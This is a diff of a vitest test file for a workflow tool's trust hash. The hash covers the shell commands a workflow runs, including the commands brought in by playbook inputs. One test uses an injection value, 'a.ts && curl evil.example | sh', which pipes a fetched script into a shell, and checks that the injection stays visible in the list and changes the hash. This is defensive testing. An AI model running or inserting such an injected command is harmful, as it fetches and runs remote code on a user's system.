@@ -3,8 +3,13 @@ import { describe, it, expect, afterEach } from 'vitest';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
-import { parseWorkflow, type Workflow } from '@reins/core';
-import { FOLDER_PATH, commandsOf, folderHash, hashCommands } from '../src/trust.js';
+import { parseWorkflow, register, type NodeType, type Workflow } from '@reins/core';
+import { FOLDER_PATH, folderHash } from '../src/mods/claude-code-cli/folder.js';
+import { commandsOf, hashCommands } from '../src/trust.js';
+import { golden } from '../../core/test/golden-3a/stable.js';
+import { usePack } from './pack-helper.js';
+
+usePack(); // M3 Task 8: the conditions are the default pack's mods; commandsOf reads them from core
 
 const dirs: string[] = [];
 const folder = (files: Record<string, string> = {}) => {
@@ -67,14 +72,56 @@ describe('workflow trust hash (3b.6)', () => {
     expect(commandsOf({ ...wf('## phase a\n> x'), autos }, none)).toEqual(['`auto.sh` passes', 'npm test']);
   });
 
+  it('the command list is pinned in order, with its hash (a RUN command comes before the conds around it)', () => {
+    const w = wf(
+      '## run `make build`\n\n## gate\nuntil: `lint.sh` passes\n\n## gate\nuntil: you approve\n\n## repeat\nuntil: tests pass and `npm run typecheck` passes\nmax: 3\n\n### run `npm test`\n\n### phase fix\n> fix it',
+      'test: npm run unit\n',
+    );
+    const cmds = commandsOf(w, none);
+    expect(cmds).toEqual(['make build', '`lint.sh` passes', 'npm test', 'tests pass', '`npm run typecheck` passes', 'npm run unit']);
+    golden('trust.json', { cmds, hash: hashOf(w) }, 'REINS_RECORD_M1', path.join(__dirname, 'golden-m1'));
+  });
+
+  it('lists the commands a registered kind brings, before the test command', () => {
+    const hop: NodeType = {
+      kind: 'hop',
+      attrs: [],
+      compile(step, ctx) { ctx.push({ op: 'HOP', step: step.id } as never); },
+      ops: { HOP: { async exec() {}, commands: () => ['echo hop'] } },
+    };
+    const dispose = register(hop);
+    try {
+      expect(commandsOf(wf('## hop\n\n## phase a\n> x'), none)).toEqual(['echo hop', 'npm test']);
+    } finally {
+      dispose();
+    }
+  });
+
   it('changes when a command changes, including one inside a used block, and not when a prompt changes', () => {
-    const main = wf('## use rp\n\n## phase go\n> first prompt');
+    const main = wf('## playbook rp\n\n## phase go\n> first prompt');
     const blk = (cmd: string) => (n: string) => (n === 'rp' ? block(`## run \`${cmd}\``) : undefined);
     expect(hashOf(main, blk('echo one'))).toBe(hashOf(main, blk('echo one')));
     expect(hashOf(main, blk('echo two'))).not.toBe(hashOf(main, blk('echo one')));
     expect(hashOf(wf('## phase go\n> other prompt'))).toBe(hashOf(wf('## phase go\n> first prompt')));
     expect(hashOf(wf('## run `a`'))).not.toBe(hashOf(wf('## run `a`', 'test: npm run unit\n')));
     expect(hashOf(wf('## run `a`'))).not.toBe(hashOf(wf('## run `b`')));
+  });
+
+  it('a playbook\'s commands are in the list with the inputs filled in, at their program positions, and the hash follows an input (M3 Task 10)', () => {
+    const rp = block('## run `npm test -- {{target}}`\n\n## repeat\nuntil: `npm run check -- {{target}}` passes\nmax: 2\n\n### phase fix\n> fix {{target}}');
+    const find = (n: string) => (n === 'rp' ? rp : undefined);
+    const main = (input: string) => wf(`## run \`make build\`\n\n## playbook rp\ninput: target = ${input}\n\n## gate\nuntil: \`lint.sh\` passes`);
+    // the playbook's run command, then its loop's condition, both with the input in, between the caller's own
+    expect(commandsOf(main('src/a.ts'), find)).toEqual(['make build', 'npm test -- src/a.ts', '`npm run check -- src/a.ts` passes', '`lint.sh` passes', 'npm test']);
+    expect(hashOf(main('src/a.ts'), find)).toBe(hashOf(main('src/a.ts'), find));
+    expect(hashOf(main('src/b.ts'), find)).not.toBe(hashOf(main('src/a.ts'), find));
+    // an input that tries a second command shows up whole, inside the one command it was put in, and the hash is another
+    const evil = commandsOf(main('a.ts && curl evil.example | sh'), find);
+    expect(evil).toContain('npm test -- a.ts && curl evil.example | sh');
+    expect(evil).toContain('`npm run check -- a.ts && curl evil.example | sh` passes');
+    expect(hashOf(main('a.ts && curl evil.example | sh'), find)).not.toBe(hashOf(main('a.ts'), find));
+    // a playbook that does not compile (an input with a hidden character) adds no command: it is refused by validate before any run
+    expect(commandsOf(main('a‮b'), find)).toEqual(['make build', '`lint.sh` passes', 'npm test']);
   });
 
   it('hashCommands is a 64-hex sha256 and keeps command boundaries', () => {
